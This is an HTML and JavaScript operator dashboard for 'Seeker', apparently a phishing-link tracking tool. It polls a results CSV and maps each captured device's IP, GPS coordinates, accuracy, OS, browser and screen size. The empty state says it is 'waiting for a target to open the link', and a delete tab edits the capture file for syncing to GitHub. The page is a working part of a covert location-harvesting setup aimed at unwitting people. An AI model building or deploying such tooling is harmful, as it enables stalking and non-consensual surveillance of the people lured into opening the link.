<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Seeker — Live Location Dashboard</title>
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <style>
    :root {
      --bg: #0e1117;
      --panel: #161b22;
      --panel-2: #1c2430;
      --border: #2a3441;
      --text: #e6edf3;
      --muted: #8b949e;
      --accent: #2f81f7;
      --accent-2: #3fb950;
      --danger: #f85149;
    }
    * { box-sizing: border-box; }
    html, body { height: 100%; margin: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: var(--bg); color: var(--text);
      display: grid; grid-template-columns: 380px 1fr; height: 100vh; overflow: hidden;
    }
    #sidebar {
      background: var(--panel); border-right: 1px solid var(--border);
      display: flex; flex-direction: column; height: 100vh; overflow: hidden;
    }
    header {
      padding: 16px 18px; border-bottom: 1px solid var(--border);
      display: flex; align-items: center; gap: 10px;
    }
    header h1 { font-size: 17px; margin: 0; font-weight: 650; letter-spacing: .2px; }
    header .dot {
      width: 9px; height: 9px; border-radius: 50%; background: var(--accent-2);
      box-shadow: 0 0 0 0 rgba(63,185,80,.6); animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0% { box-shadow: 0 0 0 0 rgba(63,185,80,.55); }
      70% { box-shadow: 0 0 0 8px rgba(63,185,80,0); }
      100% { box-shadow: 0 0 0 0 rgba(63,185,80,0); }
    }

    /* ---- Tab bar ---- */
    .tabs {
      display: flex; border-bottom: 1px solid var(--border);
    }
    .tab-btn {
      flex: 1; padding: 10px 0; font-size: 13px; font-weight: 600;
      background: none; border: none; border-bottom: 2px solid transparent;
      color: var(--muted); cursor: pointer; transition: color .15s, border-color .15s;
      border-radius: 0;
    }
    .tab-btn:hover { color: var(--text); filter: none; }
    .tab-btn.active { color: var(--text); border-bottom-color: var(--accent); }
    .tab-panel { display: none; flex: 1; flex-direction: column; overflow: hidden; }
    .tab-panel.active { display: flex; }

    /* ---- Device tab ---- */
    .stats {
      display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 14px 18px;
      border-bottom: 1px solid var(--border);
    }
    .stat { background: var(--panel-2); border: 1px solid var(--border); border-radius: 8px; padding: 10px 12px; }
    .stat .k { font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: .6px; }
    .stat .v { font-size: 20px; font-weight: 650; margin-top: 2px; }
    .toolbar {
      display: flex; align-items: center; gap: 8px; padding: 10px 18px;
      border-bottom: 1px solid var(--border); font-size: 12px; color: var(--muted);
    }
    .toolbar .spacer { flex: 1; }
    button {
      background: var(--accent); color: #fff; border: 0; border-radius: 7px;
      padding: 7px 12px; font-size: 13px; font-weight: 600; cursor: pointer;
    }
    button.ghost { background: var(--panel-2); border: 1px solid var(--border); color: var(--text); }
    button:hover { filter: brightness(1.08); }
    #list { flex: 1; overflow-y: auto; padding: 8px; }
    .card {
      background: var(--panel-2); border: 1px solid var(--border); border-radius: 9px;
      padding: 11px 12px; margin-bottom: 8px; cursor: pointer; transition: border-color .15s;
    }
    .card:hover { border-color: var(--accent); }
    .card.active { border-color: var(--accent); box-shadow: 0 0 0 1px var(--accent) inset; }
    .card .row1 { display: flex; align-items: center; justify-content: space-between; gap: 8px; }
    .card .name { font-weight: 650; font-size: 14px; }
    .card .badge {
      font-size: 10px; padding: 2px 7px; border-radius: 20px; background: rgba(47,129,247,.15);
      color: var(--accent); border: 1px solid rgba(47,129,247,.35); white-space: nowrap;
    }
    .card .meta { font-size: 12px; color: var(--muted); margin-top: 6px; line-height: 1.55; }
    .card .meta b { color: var(--text); font-weight: 600; }
    .card .ip { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
    .empty { color: var(--muted); text-align: center; padding: 40px 20px; font-size: 13px; }
    .err { color: var(--danger); }

    /* ---- Delete tab ---- */
    #delete-panel {
      overflow-y: auto; padding: 14px 18px;
    }
    #delete-panel h2 {
      font-size: 14px; margin: 0 0 12px; font-weight: 650; color: var(--muted);
      text-transform: uppercase; letter-spacing: .6px;
    }
    #delete-stats { font-size: 13px; color: var(--muted); margin-bottom: 12px; }
    .del-device {
      background: var(--panel-2); border: 1px solid var(--border); border-radius: 9px;
      padding: 11px 12px; margin-bottom: 8px;
      display: flex; justify-content: space-between; align-items: center; gap: 8px;
    }
    .del-device-info { flex: 1; min-width: 0; }
    .del-device-info strong { font-size: 13px; font-weight: 650; display: block; }
    .del-device-info small { font-size: 11px; color: var(--muted); word-break: break-all; }
    .del-btn {
      background: var(--danger); color: #fff; border: none; padding: 7px 12px;
      border-radius: 7px; font-size: 12px; font-weight: 600; cursor: pointer; flex-shrink: 0;
    }
    .del-btn:hover { background: #d0352f; filter: none; }
    #delete-refresh-btn { margin-bottom: 12px; }

    /* ---- Map ---- */
    #map { height: 100vh; width: 100%; }
    .leaflet-popup-content { font-size: 13px; line-height: 1.55; }
    .leaflet-popup-content b { color: #0e1117; }

    @media (max-width: 720px) {
      body { grid-template-columns: 1fr; grid-template-rows: 45vh 55vh; }
      #sidebar { height: auto; }
      #map { height: 100%; }
    }
  </style>
</head>
<body>
  <div id="sidebar">
    <header>
      <span class="dot"></span>
      <h1>Seeker · Live Tracking</h1>
    </header>

    <!-- Tab bar -->
    <div class="tabs">
      <button class="tab-btn active" data-tab="device">Device</button>
      <button class="tab-btn" data-tab="delete">Delete</button>
    </div>

    <!-- Device tab -->
    <div class="tab-panel active" id="tab-device">
      <div class="stats">
        <div class="stat"><div class="k">Devices</div><div class="v" id="statCount">—</div></div>
        <div class="stat"><div class="k">Located</div><div class="v" id="statLocated">—</div></div>
      </div>
      <div class="toolbar">
        <span id="status">Initializing…</span>
        <span class="spacer"></span>
        <button class="ghost" id="fitBtn" title="Zoom to fit all markers">Fit</button>
        <button id="refreshBtn">Refresh</button>
      </div>
      <div id="list"><div class="empty">Loading device data…</div></div>
    </div>

    <!-- Delete tab -->
    <div class="tab-panel" id="tab-delete">
      <div id="delete-panel">
        <h2>Manage Devices</h2>
        <div id="delete-stats">Loading…</div>
        <button class="ghost" id="delete-refresh-btn">Reload list</button>
        <div id="delete-list"></div>
      </div>
    </div>
  </div>

  <div id="map"></div>

  <script>
  (function () {
    'use strict';

    var POLL_MS = 10000;
    var DATA_URL = 'db/results.csv';

    var map = L.map('map', { zoomControl: true }).setView([29.315, 48.020], 6);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      maxZoom: 19,
      attribution: '&copy; OpenStreetMap contributors'
    }).addTo(map);

    var markers = [];
    var devices = [];
    var activeIdx = -1;
    var didInitialFit = false;

    /* ---- Tab switching ---- */
    document.querySelectorAll('.tab-btn').forEach(function (btn) {
      btn.addEventListener('click', function () {
        document.querySelectorAll('.tab-btn').forEach(function (b) { b.classList.remove('active'); });
        document.querySelectorAll('.tab-panel').forEach(function (p) { p.classList.remove('active'); });
        btn.classList.add('active');
        document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
        if (btn.dataset.tab === 'delete') loadDeleteList();
      });
    });

    /* ---- CSV parser (shared) ---- */
    function parseCsvLine(line) {
      var out = [], cur = '', inQ = false;
      for (var i = 0; i < line.length; i++) {
        var c = line[i];
        if (inQ) {
          if (c === '"') {
            if (line[i + 1] === '"') { cur += '"'; i++; }
            else inQ = false;
          } else cur += c;
        } else {
          if (c === '"') inQ = true;
          else if (c === ',') { out.push(cur); cur = ''; }
          else cur += c;
        }
      }
      out.push(cur);
      return out;
    }

    function num(v) {
      if (v == null) return NaN;
      var m = String(v).replace(/[^\d.\-]/g, '');
      return parseFloat(m);
    }

    function parseRow(cols) {
      var d = {
        os: cols[0] || '', platform: cols[1] || '', cores: cols[2] || '',
        ram: cols[3] || '', vendor: cols[4] || '', gpu: cols[5] || '',
        res: cols[6] || '', ua: cols[7] || '', ip: cols[8] || '',
        geo: '', lat: NaN, lon: NaN, acc: '', alt: '', dir: '', spd: ''
      };
      var latIdx = -1;
      for (var i = 9; i < cols.length - 1; i++) {
        if (/deg\s*$/i.test(cols[i]) && /deg\s*$/i.test(cols[i + 1] || '')) { latIdx = i; break; }
      }
      if (latIdx === -1) {
        for (var j = cols.length - 1; j >= 9; j--) {
          if (/deg\s*$/i.test(cols[j])) { latIdx = Math.max(9, j - 1); break; }
        }
      }
      if (latIdx >= 15) {
        var g = cols.slice(9, 15).filter(function (x) { return x && x !== 'Not Available'; });
        var loc = [cols[12], cols[11], cols[10]].filter(function (x) { return x && x !== 'Not Available'; });
        d.geo = loc.join(', ');
        d.org = cols[13] || ''; d.isp = cols[14] || '';
      }
      if (latIdx >= 0) {
        d.lat = num(cols[latIdx]);
        d.lon = num(cols[latIdx + 1]);
        d.acc = cols[latIdx + 2] || '';
        d.alt = cols[latIdx + 3] || '';
        d.dir = cols[latIdx + 4] || '';
        d.spd = cols[latIdx + 5] || '';
      }
      d.hasLoc = isFinite(d.lat) && isFinite(d.lon) &&
                 Math.abs(d.lat) <= 90 && Math.abs(d.lon) <= 180;
      return d;
    }

    function shortUA(ua) { return ua || 'Unknown'; }

    function accStr(a) {
      var n = num(a);
      if (!isFinite(n)) return a || '—';
      return n >= 1000 ? (n / 1000).toFixed(1) + ' km' : Math.round(n) + ' m';
    }

    function esc(s) {
      return String(s == null ? '' : s)
        .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    }

    function popupHtml(d, idx) {
      return '<b>Device #' + (idx + 1) + '</b><br>' +
        '<b>IP:</b> ' + esc(d.ip) + '<br>' +
        (d.geo ? '<b>Location:</b> ' + esc(d.geo) + '<br>' : '') +
        '<b>Coords:</b> ' + d.lat.toFixed(6) + ', ' + d.lon.toFixed(6) + '<br>' +
        '<b>Accuracy:</b> ' + esc(accStr(d.acc)) + '<br>' +
        '<b>OS:</b> ' + esc(d.os) + ' &middot; <b>' + esc(d.platform) + '</b><br>' +
        '<b>Browser:</b> ' + esc(shortUA(d.ua)) + '<br>' +
        '<b>Screen:</b> ' + esc(d.res) +
        '<br><a href="https://www.google.com/maps/place/' + d.lat + ',' + d.lon +
        '" target="_blank" rel="noopener">Open in Google Maps ↗</a>';
    }

    function cardHtml(d, idx) {
      var title = d.geo || (d.hasLoc ? 'Located device' : 'No GPS fix');
      var badge = d.hasLoc ? accStr(d.acc) + ' acc' : 'no fix';
      return '' +
        '<div class="row1"><span class="name">#' + (idx + 1) + ' · ' + esc(title) + '</span>' +
        '<span class="badge">' + esc(badge) + '</span></div>' +
        '<div class="meta">' +
        '<span class="ip">' + esc(d.ip) + '</span><br>' +
        '<b>' + esc(d.os) + '</b> · ' + esc(d.ua) + '<br>' +
        (d.hasLoc ? d.lat.toFixed(5) + ', ' + d.lon.toFixed(5) : '<span class="err">location unavailable</span>') +
        ' · ' + esc(d.res) +
        '</div>';
    }

    function focusDevice(idx) {
      activeIdx = idx;
      var d = devices[idx];
      var cards = document.querySelectorAll('#list .card');
      cards.forEach(function (c, i) { c.classList.toggle('active', i === idx); });
      if (d && d.hasLoc && markers[idx]) {
        map.setView([d.lat, d.lon], Math.max(map.getZoom(), 15));
        markers[idx].openPopup();
      }
    }

    function render() {
      var located = devices.filter(function (d) { return d.hasLoc; }).length;
      document.getElementById('statCount').textContent = devices.length;
      document.getElementById('statLocated').textContent = located;

      markers.forEach(function (m) { if (m) map.removeLayer(m); });
      markers = [];
      devices.forEach(function (d, i) {
        if (d.hasLoc) {
          var m = L.marker([d.lat, d.lon]).addTo(map).bindPopup(popupHtml(d, i));
          m.on('click', function () { focusDevice(i); });
          markers[i] = m;
        } else {
          markers[i] = null;
        }
      });

      var list = document.getElementById('list');
      if (!devices.length) {
        list.innerHTML = '<div class="empty">No devices captured yet.<br>Waiting for a target to open the link…</div>';
      } else {
        list.innerHTML = '';
        devices.forEach(function (d, i) {
          var el = document.createElement('div');
          el.className = 'card' + (i === activeIdx ? ' active' : '');
          el.innerHTML = cardHtml(d, i);
          el.addEventListener('click', function () { focusDevice(i); });
          list.appendChild(el);
        });
      }

      if (!didInitialFit) {
        var pts = markers.filter(Boolean).map(function (m) { return m.getLatLng(); });
        if (pts.length) { map.fitBounds(L.latLngBounds(pts).pad(0.25)); didInitialFit = true; }
      }
    }

    function fitAll() {
      var pts = markers.filter(Boolean).map(function (m) { return m.getLatLng(); });
      if (pts.length === 1) map.setView(pts[0], 15);
      else if (pts.length) map.fitBounds(L.latLngBounds(pts).pad(0.25));
    }

    function setStatus(txt, isErr) {
      var el = document.getElementById('status');
      el.textContent = txt;
      el.className = isErr ? 'err' : '';
    }

    function timeStr() {
      var d = new Date();
      return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    }

    function load() {
      fetch(DATA_URL + '?_=' + Date.now(), { cache: 'no-store' })
        .then(function (r) {
          if (!r.ok) throw new Error('HTTP ' + r.status);
          return r.text();
        })
        .then(function (text) {
          var lines = text.split(/\r?\n/).filter(function (l) { return l.trim().length; });
          devices = lines.map(function (l) { return parseRow(parseCsvLine(l)); });
          render();
          setStatus('Updated ' + timeStr() + ' · every ' + (POLL_MS / 1000) + 's', false);
        })
        .catch(function (e) {
          setStatus('Fetch failed: ' + e.message, true);
          if (!devices.length) {
            document.getElementById('list').innerHTML =
              '<div class="empty err">Could not load <code>' + DATA_URL + '</code>.<br>' +
              'Serve this page from the seeker directory so <code>db/results.csv</code> is reachable.</div>';
          }
        });
    }

    document.getElementById('refreshBtn').addEventListener('click', load);
    document.getElementById('fitBtn').addEventListener('click', fitAll);

    load();
    setInterval(load, POLL_MS);

    /* ---- Delete tab logic ---- */
    function loadDeleteList() {
      var statsEl = document.getElementById('delete-stats');
      var listEl = document.getElementById('delete-list');
      statsEl.textContent = 'Loading…';
      listEl.innerHTML = '';

      fetch(DATA_URL + '?_=' + Date.now(), { cache: 'no-store' })
        .then(function (r) {
          if (!r.ok) throw new Error('HTTP ' + r.status);
          return r.text();
        })
        .then(function (text) {
          var lines = text.split(/\r?\n/).filter(function (l) { return l.trim(); });
          statsEl.textContent = lines.length + ' device(s) found';

          lines.forEach(function (line, idx) {
            var cols = parseCsvLine(line);
            if (cols.length < 9) return;

            var os = cols[0] || 'Unknown';
            var ip = cols[8] || 'Unknown';
            var lat = '', lon = '';
            for (var i = 9; i < cols.length - 1; i++) {
              if (/deg\s*$/i.test(cols[i]) && /deg\s*$/i.test(cols[i + 1] || '')) {
                lat = cols[i]; lon = cols[i + 1]; break;
              }
            }

            var div = document.createElement('div');
            div.className = 'del-device';
            div.innerHTML =
              '<div class="del-device-info">' +
                '<strong>[' + idx + '] ' + esc(os.substring(0, 50)) + '</strong><br>' +
                '<small>IP: ' + esc(ip) + (lat ? ' | ' + esc(lat) + ', ' + esc(lon) : '') + '</small>' +
              '</div>' +
              '<button class="del-btn">Delete</button>';
            div.querySelector('.del-btn').addEventListener('click', function () {
              deleteDevice(idx, lines);
            });
            listEl.appendChild(div);
          });
        })
        .catch(function (e) {
          statsEl.textContent = 'Error: ' + e.message;
        });
    }

    function deleteDevice(index, lines) {
      if (!confirm('Delete device #' + index + '?')) return;
      lines.splice(index, 1);
      var newCsv = lines.join('\n');
      var blob = new Blob([newCsv], { type: 'text/csv' });
      var url = URL.createObjectURL(blob);
      var a = document.createElement('a');
      a.href = url;
      a.download = 'results.csv';
      a.click();
      alert('Downloaded updated results.csv — replace the file in seeker/db/ and the sync will push it to GitHub.');
      loadDeleteList();
    }

    document.getElementById('delete-refresh-btn').addEventListener('click', loadDeleteList);

  })();
  </script>
</body>
</html>
